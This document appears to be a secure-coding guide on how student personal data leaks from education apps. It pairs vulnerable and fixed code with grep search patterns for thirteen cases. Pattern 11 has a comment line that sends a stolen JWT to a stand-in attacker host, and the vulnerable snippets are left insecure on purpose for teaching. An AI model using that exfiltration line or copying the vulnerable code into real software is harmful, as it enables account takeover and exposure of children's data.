# Student Data Exposure Patterns

## Pattern 1: PII in Application Logs

**Risk**: Student names, emails, and grades appearing in log files accessible to ops teams or log aggregation services.

```typescript
// VULNERABLE
logger.info(`Student ${student.name} scored ${score} on ${exam.title}`);
logger.error(`Failed to update grade for ${student.email}: ${error.message}`);

// FIXED: Use opaque identifiers
logger.info(`Student ${student.id} scored on exam ${exam.id}`);
logger.error(`Failed to update grade for student ${student.id}: ${error.code}`);
```

**Search pattern:**
```bash
grep -rn "student\.\(name\|email\|firstName\|lastName\)" --include="*.ts" --include="*.py" src/ | grep -i "log\|console\|print\|debug\|info\|warn\|error"
```

## Pattern 2: Analytics Events with PII

**Risk**: Student data sent to PostHog, Mixpanel, Google Analytics, or similar services without anonymization.

```typescript
// VULNERABLE
posthog.capture("assignment_submitted", {
  studentName: student.name,
  studentEmail: student.email,
  grade: submission.grade,
  schoolName: school.name,
});

// FIXED: Anonymize and aggregate
posthog.capture("assignment_submitted", {
  studentId: hashId(student.id), // One-way hash
  gradeRange: getGradeRange(submission.grade), // "A" not "94.5"
  schoolId: school.id,
});
```

**Search pattern:**
```bash
grep -rn "capture\|track\|identify\|analytics\.\|gtag\|mixpanel\|posthog" --include="*.ts" --include="*.tsx" --include="*.js" src/ | grep -iv "test\|spec\|mock"
```

## Pattern 3: Over-Exposed API Responses

**Risk**: API returns full student objects including fields the client doesn't need.

```typescript
// VULNERABLE: Returns everything including internal fields
app.get("/api/class/:id/students", async (req, res) => {
  const students = await Student.find({ classId: req.params.id });
  res.json(students); // Includes SSN, parentEmail, homeAddress, medicalNotes...
});

// FIXED: Select only display fields
app.get("/api/class/:id/students", async (req, res) => {
  const students = await Student.find({ classId: req.params.id })
    .select("id displayName avatarUrl");
  res.json(students);
});
```

## Pattern 4: Student Data in Error Responses

**Risk**: Detailed error messages expose student data to the client or to error tracking services.

```typescript
// VULNERABLE
catch (error) {
  res.status(500).json({
    message: `Failed to process grade for ${student.name} (${student.email}): ${error.message}`,
    stack: error.stack, // Internal stack trace
  });
}

// FIXED
catch (error) {
  logger.error(`Grade processing failed for student ${student.id}`, { errorCode: error.code });
  res.status(500).json({ message: "Failed to process grade. Please try again." });
}
```

## Pattern 5: Cached Data Without Tenant Scoping

**Risk**: Student data cached with keys that don't include organization ID, allowing cross-tenant cache hits.

```typescript
// VULNERABLE
const cacheKey = `students:grade:${gradeLevel}`;
const students = cache.get(cacheKey) || await fetchAndCache(cacheKey);

// FIXED
const cacheKey = `org:${orgId}:students:grade:${gradeLevel}`;
```

## Pattern 6: Student Data in LLM Prompts

**Risk**: Student PII sent to external LLM APIs, stored in vendor logs, or leaked through completions.

```typescript
// VULNERABLE
const prompt = `Grade this essay by ${student.name} (Grade ${student.gradeLevel}):
${student.essay}

The student's IEP accommodations are: ${student.iepNotes}`;

// FIXED: Minimize PII, use anonymous references
const prompt = `Grade this student essay for a ${gradeLevel}th grader:
${student.essay}

Note: Apply extended-time accommodations per the rubric.`;
```

## Pattern 7: Client-Side Storage of Sensitive Data

**Risk**: Student data stored in localStorage, sessionStorage, or cookies — accessible to XSS attacks and browser extensions.

```typescript
// VULNERABLE
localStorage.setItem("currentStudents", JSON.stringify(students));
localStorage.setItem("recentGrades", JSON.stringify(grades));

// FIXED: Keep sensitive data in server-managed sessions only
// Use React Query or similar for client-side caching with automatic cleanup
```

## Pattern 8: Missing Data Retention Enforcement

**Risk**: Student data stored indefinitely without automatic cleanup, violating FERPA/GDPR retention requirements.

```sql
-- VULNERABLE: No retention policy
CREATE TABLE student_activity_logs (
  id SERIAL PRIMARY KEY,
  student_id INT REFERENCES students(id),
  action TEXT,
  created_at TIMESTAMP DEFAULT NOW()
  -- No TTL, no archival, no deletion schedule
);

-- FIXED: Include retention metadata
CREATE TABLE student_activity_logs (
  id SERIAL PRIMARY KEY,
  student_id INT REFERENCES students(id),
  action TEXT,
  created_at TIMESTAMP DEFAULT NOW(),
  expires_at TIMESTAMP DEFAULT (NOW() + INTERVAL '2 years'),
  retention_policy TEXT DEFAULT 'educational_record_2yr'
);
-- Plus: scheduled job to purge expired records
```

## Pattern 9: Unscoped Bulk Export

**Risk**: Export/download endpoints that don't limit scope, allowing download of all student data.

```typescript
// VULNERABLE: No pagination, no org scope
app.get("/api/export/students", async (req, res) => {
  const all = await Student.find();
  res.csv(all);
});

// FIXED: Scoped, paginated, audit-logged
app.get("/api/export/students", authMiddleware, requireRole("admin"), async (req, res) => {
  const students = await Student.find({ orgId: req.user.orgId }).limit(1000);
  auditLog.record({ actor: req.user.id, action: "bulk_export", count: students.length });
  res.csv(students.map(sanitizeForExport));
});
```

## Pattern 10: Analytics Track Function with Unfiltered Args Spread

**Risk**: A generic `track()` wrapper that spreads all arguments to PostHog/GA. Any caller can accidentally send student PII to third-party analytics without realizing it.

```typescript
// VULNERABLE: track() spreads ...args directly to PostHog
export const trackEvent = () => {
  const posthog = usePostHog();

  const track = useCallback(async (event: AnalyticsEvent, ...args: any[]) => {
    ReactGA.event(event, ...args);
    posthog.capture(`${event.category} - ${event.action}`, args); // Whatever callers pass ends up in PostHog
    await createAudit({ actionName: `${event.category}`, extraDetails: { ...event, ...args } });
  }, []);

  return { trackEvent: track };
};

// Any caller can now do:
track({ category: "Grading", action: "grade.submit", label: "essay" }, { studentName: "John", grade: "A+" });
// → "John" and "A+" are now in PostHog

// FIXED: Whitelist allowed properties, strip PII from analytics payloads
const ALLOWED_ANALYTICS_KEYS = ["category", "action", "label", "value", "toolId", "contentType"];

const sanitizeAnalyticsPayload = (data: Record<string, unknown>) => {
  return Object.fromEntries(
    Object.entries(data).filter(([key]) => ALLOWED_ANALYTICS_KEYS.includes(key))
  );
};

const track = useCallback(async (event: AnalyticsEvent) => {
  const safeEvent = sanitizeAnalyticsPayload(event);
  posthog.capture(`${event.category} - ${event.action}`, safeEvent);
}, []);
```

**Search pattern:**
```bash
grep -rn "track(\|capture(" --include="*.ts" --include="*.tsx" src/ | grep -E "\.\.\.|args|spread|rest"
```

## Pattern 11: JWT Token in localStorage with Client-Side Decode

**Risk**: Auth tokens stored in localStorage are accessible to any XSS attack. Client-side JWT decoding with `atob()` confirms tokens are fully readable from JavaScript.

```typescript
// VULNERABLE: Token in localStorage, decoded in client
let jwt = JSON.parse(localStorage.getItem("userState") || "{}").token;
const jwtPayload = JSON.parse(window.atob(jwt.split(".")[1]));
const exp = jwtPayload.exp;

// If any XSS exists on the page, attacker can:
// 1. Read the token: localStorage.getItem("userState")
// 2. Decode it: atob(token.split(".")[1])
// 3. Send it to their server: fetch("https://evil.com/steal?token=" + token)
// 4. Impersonate the user with full account access

// SAFER: Use HttpOnly cookies for auth tokens
// If localStorage is required (e.g., cross-domain auth, iframe contexts),
// minimize the token scope:
// - Short expiry (15 min max)
// - Audience-restricted
// - Monitor for token reuse from different IPs
// - Clear tokens aggressively on logout/tab close
window.addEventListener("beforeunload", () => {
  if (!rememberMe) sessionStorage.removeItem("authToken");
});
```

**Search pattern:**
```bash
grep -rn "atob\|jwt.*split\|token.*parse\|localStorage.*token" --include="*.ts" --include="*.tsx" src/
```

## Pattern 12: Error Sanitizer with Incomplete PII Redaction

**Risk**: Error observability code that redacts `token/password/secret/authorization` but NOT `email/name/grade/studentId` — giving a false sense of security while student PII still flows to PostHog/Sentry.

```typescript
// PARTIAL: Only auth secrets are redacted
const sanitizePayload = (data: unknown): unknown => {
  for (const [key, value] of Object.entries(data)) {
    const lowerKey = key.toLowerCase();
    if (lowerKey.includes("token") || lowerKey.includes("password") || lowerKey.includes("secret")) {
      sanitized[key] = "[redacted]";  // ✅ Good
    } else {
      sanitized[key] = value;  // ❌ email, name, grade pass through
    }
  }
};

// FIXED: Redact PII fields too
const PII_PATTERNS = ["token", "password", "secret", "authorization",
  "email", "name", "firstname", "lastname", "fullname",
  "phone", "address", "ssn", "birthdate", "grade", "score",
  "studentid", "studentname"];

const sanitizePayload = (data: unknown): unknown => {
  for (const [key, value] of Object.entries(data)) {
    const lowerKey = key.toLowerCase();
    if (PII_PATTERNS.some(p => lowerKey.includes(p))) {
      sanitized[key] = "[redacted]";
    } else {
      sanitized[key] = sanitizePayload(value); // Recurse
    }
  }
};
```

**Search pattern:**
```bash
grep -rn "sanitize\|redact\|\[redacted\]" --include="*.ts" --include="*.tsx" src/ | grep -v "node_modules\|\.test\."
```

## Pattern 13: Generated API Client Returning Full Student Objects

**Risk**: Orval/OpenAPI code generators create typed hooks that return full API response objects. If the backend returns more fields than the UI needs, the client silently receives sensitive data that sits in React Query cache and browser memory.

```typescript
// GENERATED BY ORVAL — returns whatever the backend sends
export const useGetStudentDetail = (studentId: string) => {
  return useQuery(["student", studentId], () =>
    axios.get(`/api/students/${studentId}`)
    // Response may include: email, parentEmail, homeAddress, medicalNotes, iepStatus...
  );
};

// In component — only uses displayName and avatar, but full object is in memory
const { data: student } = useGetStudentDetail(id);
return <div>{student.displayName}</div>;
// student.email, student.parentEmail etc. are in browser memory and React DevTools

// FIX: This is a backend fix — API should return minimal fields per endpoint.
// Frontend mitigation: select only needed fields from the query
const { data: student } = useGetStudentDetail(id, {
  select: (data) => ({ displayName: data.displayName, avatarUrl: data.avatarUrl }),
});
```

**Search pattern:**
```bash
# Find generated API hooks that fetch student data
grep -rn "useGet.*Student\|useGet.*Grade\|useGet.*Profile\|useList.*Student" --include="*.ts" --include="*.tsx" src/
```
